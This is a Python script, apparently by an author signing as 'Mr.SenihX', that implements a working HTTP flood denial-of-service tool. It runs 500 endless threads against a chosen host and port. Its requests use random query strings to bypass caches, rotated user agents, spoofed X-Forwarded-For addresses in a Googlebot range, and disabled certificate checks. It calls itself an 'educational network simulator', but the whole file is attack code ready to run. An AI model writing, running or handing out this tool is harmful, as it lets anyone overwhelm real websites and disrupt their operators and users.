import socket
import threading
import random
import argparse
import time
import ssl

print("\033[92m🚀 Mr.SenihX tarafından Tasarlandı\033[0m")

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
]
methods = ["GET", "POST"]

def generate_random_ip():
    return f"66.249.{random.randint(0, 255)}.{random.randint(0, 255)}"

def flood_attack(target, port, method, user_agent):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        
        if port == 443:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=target)

        sock.connect((target, port))

        x_forwarded_for = generate_random_ip()
        url_path = f"/?s={random.randint(1, 100000)}"

        headers = [
            f"{method} {url_path} HTTP/1.1",
            f"Host: {target}",
            f"User-Agent: {user_agent}",
            "Accept: text/html",
            "Accept-Language: en-US,en;q=0.5",
            "Cache-Control: no-cache",
            "Connection: Keep-Alive"
        ]

        body = "param1=value1&param2=value2"
        if method == "POST":
            headers.append(f"Content-Length: {len(body)}")

        request = "\r\n".join(headers) + "\r\n\r\n"
        if method == "POST":
            request += body

        sock.sendall(request.encode())
        sock.recv(4096)
    except socket.timeout:
        pass
    except Exception:
        pass
    finally:
        if 'sock' in locals():
            sock.close()

def attack_worker(target, port):
    while True:
        method = random.choice(methods)
        user_agent = random.choice(user_agents)
        flood_attack(target, port, method, user_agent)

def main():
    parser = argparse.ArgumentParser(description="Eğitim amaçlı ağ simülatörü")
    parser.add_argument("-t", "--target", required=True, help="Hedef domain veya IP adresi")
    parser.add_argument("-p", "--port", type=int, default=80, help="Port numarası (varsayılan: 80)")
    parser.add_argument("-r", "--threads", type=int, default=500, help="Kullanılacak thread sayısı (varsayılan: 500)")
    args = parser.parse_args()

    for _ in range(args.threads):
        threading.Thread(target=attack_worker, args=(args.target, args.port), daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nSaldırı durduruldu!")

if __name__ == "__main__":
    main()
